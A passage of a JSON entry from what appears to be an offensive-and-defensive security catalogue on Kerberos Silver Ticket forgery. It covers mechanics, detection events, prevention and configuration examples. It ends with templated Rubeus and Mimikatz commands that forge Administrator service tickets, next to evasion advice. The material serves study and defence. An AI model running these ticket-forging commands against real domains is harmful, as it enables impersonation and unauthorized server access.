      "notes": "Silver tickets never contact KDC for TGS — no event 4769. Stealthy but limited to specific service. Machine$ accounts for host/cifs.",
      "references": [
        {
          "title": "CRTP - Silver Ticket",
          "url": "https://www.alteredsecurity.com/adlab"
        },
        {
          "title": "HackTricks - Silver Ticket",
          "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
        }
      ],
      "defense": {
        "why_it_works": "Silver Tickets are forged Kerberos service tickets (TGS) signed with the service account's NTLM hash — not the krbtgt hash. The target service validates the ticket using its own key, not by contacting the KDC. A forged silver ticket for CIFS/HOST on a server grants file system or command execution access to that specific server as any user (including DA), without any KDC interaction — making it stealthier than a Golden Ticket.",
        "prerequisites": "NTLM hash of the target service account or computer account. Domain SID. Target server FQDN and service SPN. Rubeus /silver or Mimikatz. Network access to the target service.",
        "impact": "T1558.002 Steal or Forge Kerberos Tickets: Silver Ticket. Access to a specific service on a specific server as any user — DA-equivalent access to that host. Common targets: CIFS (file shares), HOST (full system access), HTTP (web apps), MSSQL. No KDC interaction means traditional Kerberos logging is bypassed.",
        "detection": "Event 4624 (logon) on target server with Kerberos authentication but no corresponding Event 4768/4769 on the DC (silver ticket skips KDC entirely). MDI: 'Suspected Kerberos forged ticket' — detects when authentication arrives without a prior KDC exchange. Sysmon Event 3: network connection from unexpected source using Kerberos to reach a service. PAC validation if enabled on the service (PAC validation contacts DC — would catch forged PACs).\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
        "artifacts": "Event 4624 on target: type 3 Kerberos with no prior 4768 on DC | MDI: forged Kerberos ticket alert | Absence of 4769 on DC for the connection | Target service access logs showing unexpected user access",
        "prevention": "Enable PAC validation on services (requires DC contact for every service authentication — catches forged PACs). Rotate service account passwords regularly. Use gMSA (auto-rotating passwords — forged silver ticket expires when password rotates). MDI deployment. Monitor for Kerberos authentication without prior KDC exchange.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
        "evasion": "Silver tickets only work for the specific service on the specific host — more limited than Golden Tickets but much stealthier. No KDC log entries. Use for targeted access rather than broad movement.",
        "sources": [
          "https://attack.mitre.org/techniques/T1558/002/"
        ],
        "misconfiguration": "Service accounts have weak/old NTLM hashes (from Kerberoasting). No PAC validation enabled on services. gMSA not used. No monitoring for KDC-bypass authentication patterns.",
        "vulnerable_config": "# Service account with stale NTLM hash (Kerberoasted + cracked):\n# MSSQL running as svc_sql with password 'Sql2018!' — same hash for 5 years\n# Silver ticket for MSSQLSvc/server.corp.local forged → full DB access as DA\n\n# PAC validation disabled (default — services don't validate PAC with DC):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 0 (or absent)",
        "secure_config": "# Use gMSA for all service accounts (auto-rotating passwords every 30 days):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'sql.corp.local' -ManagedPasswordIntervalInDays 30\n\n# Enable PAC validation (forces DC contact for each auth — catches forged PACs):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 1\n# Note: performance impact — evaluate per-environment\n\n# Monitor for Kerberos auth without prior KDC exchange:\n# MDI: 'Suspected Kerberos forged ticket (silver ticket)' alert — enabled by default\n\n# Rotate compromised service account passwords immediately:\nSet-ADAccountPassword svc_sql -Reset -NewPassword (ConvertTo-SecureString (New-Guid) -AsPlainText -Force)"
      },
      "variations": [
        {
          "label": "CIFS service (file access)",
          "command": "Rubeus.exe silver /service:cifs/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
        },
        {
          "label": "HOST service (schtasks/wmi)",
          "command": "Rubeus.exe silver /service:host/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
        },
        {
          "label": "Mimikatz",
          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
        }
      ]
